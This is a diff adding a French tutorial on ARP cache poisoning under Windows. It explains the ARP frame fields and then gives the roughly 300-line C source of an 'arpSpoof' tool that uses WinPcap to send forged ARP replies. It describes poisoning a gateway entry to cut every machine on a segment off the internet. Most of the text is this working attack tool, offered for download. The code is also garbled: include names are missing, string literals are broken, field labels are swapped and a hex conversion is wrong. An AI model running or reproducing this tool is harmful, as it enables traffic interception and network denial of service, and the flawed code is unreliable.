@@ -1,0 +1,431 @@
+ARP cache POISONNING sous windows
+par Zib
+
+
+L'arp cache poisonning consiste a (comme son nom l'indique) empoisonner le cache arp d'une victime . Kezako ? Le cache 
+arp permet de transcrire les adresses IP (du type 194.214.19.01) vers des adresses PHYSIQUES (du type 00:Ae:45:34:34:56)
+ ( voir fonctionnement de la couche liaison de donnees du modele OSI pour plus d'info).
+
+A partir d'un empoisonnement on donc peut se faire passer pour n'importe qu'elle machine d'un segment ethernet.
+
+pour downloader voir la suite ...
+
+DOWNLOAD du projet et des sources
+exemple de segment ethernet :
+
+
+PC1        PC2       PC3
+i___________i_________i
+
+
+Adresse Mac PC1 = 00:00:00:00:00:01
+Adresse MAC PC2 = 00:00:00:00:00:02
+Adresse MAC PC3 = 00:00:00:00:00:03
+
+Adresse IP PC1 = 100.100.100.1
+Adresse IP PC2 = 100.100.100.2
+Adresse IP PC3 = 100.100.100.3
+
+jusque la c'est pas trop compliqué ;)
+Si PC1 veut communiquer avec PC3 PC1 connait l'adresse IP de PC3 mais pas son adresse physique . Donc pour l'instant il 
+lui faut trouver l'adresse physique de PC3. Pour cela PC1 va envoyer une trame "arp query" a travers le protocol ARP 
+permettant de recuperer l'adresse physique cette trame est constitué de la maniere suivant :
+
+@MAC destination sur 6octets = ff:ff:ff:ff:ff:ff (broadcast envoi a tte les machine)
+@MAC source sur 6 octets = adresse mac de PC1
+Code du protocole superieur = 0806 pour ARP
+Code du type de segment = 0001 (ethernet)
+Code du protocole d'adressage = 0800 (IP)
+Taille de l'adresse du protocole d'adressage = 4 (en octets)
+Type de trame ARP = 0001 (DEMANDE, 0002 pour reponse)
+@MAC de pc1 = 100.100.100.1
+@ip de PC1 = 00:00:00:00:00:01
+@mac de pc3 (le champs est vide lors de la demande et rempli a l'arrivée)
+@ip de pc3 = 100.100.100.3
+
+
+la trame est envoyé
+PC3 repond avec un "ARP reponse" (ARP reply)
+
+@MAC destination sur 6octets = adresse mac de PC1 
+@MAC source sur 6 octets = adresse mac de PC3
+Code du protocole superieur = 0806 pour ARP
+Code du type de segment = 0001 (ethernet)
+Code du protocole d'adressage = 0800 (IP)
+Taille de l'adresse du protocole d'adressage = 4 (en octets)
+Type de trame ARP = 0002 (REPONSE, 0001 pour demande)
+@mac de pc3 = 00:00:00:00:00:03
+@ip de pc3 = 100.100.100.3
+@MAC de pc1 = 00:00:00:00:00:01
+@ip de PC1 = 100.100.100.1
+
+VOILA A CE MOMENT PC1 A OBTENU L'ADRESSE MAC DE PC3
+ILS PEUVENT DONC COMMUNIQUER SANS PROBELEMES
+
+La faille (l'attaque ..) consiste a envoyer une fausse reponse de maniere periodique . cela aura pour consequence de 
+tromper la machine cible sur la correspondance entre @ mac et @ ip , sa table de corrsepondance sera donc empoisonner !
+ pour cela rien de plus imple on forge a l'aide de la bibliotheque WINPCAP de fausses ARP REPLY ! exemple :
+
+@MAC destination sur 6octets = adresse mac de PC1 
+@MAC source sur 6 octets = Adresse mac de l'attanquant(pc2)
+Code du protocole superieur = 0806 pour ARP
+Code du type de segment = 0001 (ethernet)
+Code du protocole d'adressage = 0800 (IP)
+Taille de l'adresse du protocole d'adressage = 4 (en octets)
+Type de trame ARP = 0002 (REPONSE, 0001 pour demande)
+@mac de pc2 = 00:00:00:00:00:02
+@ip de pc3 = 100.100.100.3
+@MAC de pc1 = 00:00:00:00:00:01
+@ip de PC1 = 100.100.100.1
+
+en forgeant ce paquet on corrompt la table car l'adresse . PC1 a l'impression que PC3 se trouve a l'adresse mac de PC2 
+(y'a un probleme docteur ..). Les packets a destination de pc3 ne sont donc plus recu par PC3.
+Il est possible de contaminer tout un reseau, en modifiant dans toutes les tables arp des machines du segment les entrees 
+concernant L'adresse de la passerelle !
+Plus aucune machine n'est capable d'acceder a internet . (the big bordel ..)
+
+je vous met le code du programme, il n'est pas tres long 300 lignes environ :)
+pour l'utiliser : 
+installer WINPCAP sous windows
+compiler avec packet.lib
+je vous met le projet dans le zippppppp !
+
+pour ceux quca interesse la source : vite fait ... 
+Telecharger qd meme le zip .. 
+
+#include 
+#include 
+#include 
+
+void usage(void){
+	printf("
+arpSpoof	   
+");
+	printf("		Ca sert a koi : envoyer paquet ARP en mode reponse.
+");
+	printf("		pour trouver les @Mac utilisez nbtstat ...
+");
+	printf("Exemple : arpSpoof 10.4.12.14 00:09:fe:fa:34:ae 10.4.12.12 00:ae:fe:23:23:34
+");
+}
+
+unsigned char str2hex(char * str){
+	unsigned char itmp=0;
+	if(*(str)=='f')
+		itmp=15*16;
+	if(*(str)=='e')
+		itmp=14*16;
+	if(*(str)=='d')
+		itmp=13*16;
+	if(*(str)=='c')
+		itmp=12*16;
+	if(*(str)=='b')
+		itmp=11*16;
+	if(*(str)=='a')
+		itmp=10*16;
+	if(*(str)=='9')
+		itmp=9*16;
+	if(*(str)=='8')
+		itmp=8*16;
+	if(*(str)=='7')
+		itmp=7*16;
+	if(*(str)=='6')
+		itmp=6*16;
+	if(*(str)=='5')
+		itmp=5*16;
+	if(*(str)=='4')
+		itmp=4*16;
+	if(*(str)=='3')
+		itmp=3*16;
+	if(*(str)=='2')
+		itmp=2*16;
+	if(*(str)=='1')
+		itmp=1*16;
+	if(*(str)=='0')
+		itmp=0;
+	if(*(str+1)=='f')
+		itmp+=15;
+	if(*(str+1)=='e')
+		itmp+=14;
+	if(*(str+1)=='d')
+		itmp+=13;
+	if(*(str+1)=='c')
+		itmp+=12;
+	if(*(str+1)=='b')
+		itmp+=11;
+	if(*(str+1)=='a')
+		itmp+=10;
+	if(*(str+1)=='9')
+		itmp+=9;
+	if(*(str+1)=='8')
+		itmp+=8;
+	if(*(str+1)=='7')
+		itmp+=7;
+	if(*(str+1)=='6')
+		itmp+=6;
+	if(*(str+1)=='5')
+		itmp+=5;
+	if(*(str+1)=='4')
+		itmp+=4;
+	if(*(str+1)=='3')
+		itmp+=3;
+	if(*(str+1)=='2')
+		itmp+=2;
+	if(*(str+1)=='1')
+		itmp+=2;
+	if(*(str+1)=='0')
+		itmp+=0;
+	return (unsigned char)itmp;
+}
+
+// Packet Set Trame returns the size of the trame
+int PacketSetTrameArp(unsigned char * trame,
+				   unsigned char * macdst,
+				   unsigned char * ipdst,
+				   unsigned char * macsrc,
+				   unsigned char * ipsrc){
+
+		// Mac DESTINATION
+		*(trame+0)=*(macdst+0);
+		*(trame+1)=*(macdst+1);
+		*(trame+2)=*(macdst+2);
+		*(trame+3)=*(macdst+3);
+		*(trame+4)=*(macdst+4);
+		*(trame+5)=*(macdst+5);
+		// Mac SOURCE
+		*(trame+6)=*(macsrc+0);
+		*(trame+7)=*(macsrc+1);
+		*(trame+8)=*(macsrc+2);
+		*(trame+9)=*(macsrc+3);
+		*(trame+10)=*(macsrc+4);
+		*(trame+11)=*(macsrc+5);
+
+		// ARP 
+		*(trame+12)=0x08;
+		*(trame+13)=0x06;
+
+		// Hardware TYPE = ETHERNET
+		*(trame+14)=0x00;
+		*(trame+15)=0x01;
+		// Protocol TYPE = IP
+		*(trame+16)=0x08;
+		*(trame+17)=0x00;
+
+		// Hardware Size
+		*(trame+18)=0x06;
+		// Protocol Size
+		*(trame+19)=0x04;
+		
+		// Operation Code = Reponse
+		*(trame+20)=0x00;
+		*(trame+21)=0x02;
+
+		// Sender MAC @
+		*(trame+22)=*(trame+6);
+		*(trame+23)=*(trame+7);
+		*(trame+24)=*(trame+8);
+		*(trame+25)=*(trame+9);
+		*(trame+26)=*(trame+10);
+		*(trame+27)=*(trame+11);
+
+		// Sender IP @
+		*(trame+28)=*(ipsrc+0);
+		*(trame+29)=*(ipsrc+1);
+		*(trame+30)=*(ipsrc+2);
+		*(trame+31)=*(ipsrc+3);
+
+		// Target MAC @
+		*(trame+32)=*(trame+0);
+		*(trame+33)=*(trame+1);
+		*(trame+34)=*(trame+2);
+		*(trame+35)=*(trame+3);
+		*(trame+36)=*(trame+4);
+		*(trame+37)=*(trame+5);
+
+		// Target IP @
+		*(trame+38)=*(ipdst+0);
+		*(trame+39)=*(ipdst+1);
+		*(trame+40)=*(ipdst+2);
+		*(trame+41)=*(ipdst+3);
+		
+		
+
+
+		return 60;
+}
+
+BOOLEAN PrepareIpMac(int argc,
+				  char *argv[],
+				  unsigned char *macdst,
+				  unsigned char *ipdst,
+				  unsigned char *macsrc,
+				  unsigned char *ipsrc){
+	unsigned char *token;
+	unsigned i=0;
+	if(argc!=5){
+		return FALSE;
+	}
+	else{
+		
+			token=strtok(argv[1],".");
+			for(i=0;i<4;i++){
+				*(ipdst+i)=atoi(token);
+				token=strtok(NULL,".");
+			
+			}
+			token=strtok(argv[3],".");
+			for(i=0;i<4;i++){
+				*(ipsrc+i)=atoi(token);
+				token=strtok(NULL,".");
+			
+			}	
+			for(i=0;i<16;i+=3){
+				*(macdst+(int)(i/3))=str2hex(argv[2]+i);
+			}
+			for(i=0;i<16;i+=3){
+				*(macsrc+(int)(i/3))=str2hex(argv[4]+i);
+			}
+		
+
+		return TRUE;
+	}
+}
+
+
+int main(int argc,char *argv[]){
+	
+	
+
+	LPPACKET paquet;
+	LPADAPTER adapter;
+	unsigned int i=0;
+	unsigned int itmp=0;
+	unsigned int j=0;
+	unsigned long BuffSize;
+	unsigned int AdaptNumber=0;
+	unsigned int SendNumber=1;
+	WCHAR device[512];
+	WCHAR Adapter[5][100];
+	unsigned int TrameSize;
+	unsigned char trame[1600];
+	
+	unsigned char macdst[6];
+	unsigned char macsrc[6];
+	unsigned char ipdst[4];
+	unsigned char ipsrc[4];
+	if(argc!=5){
+			usage();
+			return 1;
+	}
+
+	printf("_________arpSpoof
+");
+
+
+	if((PacketGetAdapterNames((char *)device,&BuffSize))==-1){
+		printf("
+>Erreur : GetAdapterNames();");
+		return -1;
+	}
+	/*********** Give Me Adaptateur *************/
+	for(i=0;i<300;i++){
+		Adapter[j][i-itmp]=device[i];
+		if(device[i]==''){
+			itmp=i+1;
+			j++;
+		}
+	}
+
+	/*********** Choix des Adaptateurs **********/
+	printf("Choix adaptateur :");
+	for(i=0;i<5;i++){
+		printf("
+	# %d -> ",i);
+		wprintf(Adapter[i]);
+	}
+	printf("
+> ");
+	scanf("%d",&AdaptNumber);
+
+	/*********** Open Adaptater *****************/
+	adapter = PacketOpenAdapter((char *)Adapter[AdaptNumber]);
+	if(adapter<=0){
+		printf(">Erreur : Ouverture de l'adaptateur !");
+		return -1;
+	}
+	else{ 
+		printf(">Open Adapter 		[Done]");
+	}
+
+	/*********** Allocate Packet ****************/
+	paquet = PacketAllocatePacket();
+	if(!paquet){
+		printf("
+>Erreur : AllocatePacket();");
+		return -1;
+	}
+	else{ 
+		printf("
+>Allocate Packet 	[Done]");
+	}
+
+	/*********** PrepareIpMac ******************/
+	if(!PrepareIpMac(argc,argv,macdst,ipdst,macsrc,ipsrc)){
+		printf("
+>Formatage des donnees OUPS!");
+	}
+
+	/*********** Packet Set Trame Prepare Ma trame !****/
+	if(!(TrameSize=PacketSetTrameArp(trame,macdst,ipdst,macsrc,ipsrc))){
+		printf("
+>Erreur PacketSetTrame");
+		return 1;
+	}
+	else{
+		printf("
+>PacketSetTrame 	[Done]");
+	}
+
+	/*********** Initialise le paquet ***********/
+	PacketInitPacket(paquet,trame,TrameSize);
+	
+	/*********** Taille buffer driver************/
+	PacketSetBuff(adapter, 512000);
+retour:;	
+	/*********** Demande nombre d'envoi *********/
+	printf("
+>Quantite : ");
+	scanf("%d",&SendNumber);
+	
+	/*********** SET Nombre d'envoi du paquet ***/
+	if(!PacketSetNumWrites(adapter,SendNumber)){
+		printf(">Erreur : SetNumWrites");
+	}
+	else{
+		printf(">SetNumWrites		[Done]");
+	}
+	
+	if(!PacketSendPacket(adapter,paquet,1)){
+		printf("
+>Erreur SendPacket");
+		return -1;
+	}
+	else{
+		printf("
+>PacketSendPacket 	[Done]");
+
+	}
+	printf("
+> %d Paquets envoyes avec succes ",SendNumber);
+	printf("
+>Restart o/n ?");
+	
+	if(getch()=='o'){
+		goto retour;
+	}
+
+	PacketFreePacket(paquet);
+	PacketCloseAdapter(adapter);	
+	return 1;
+
+}
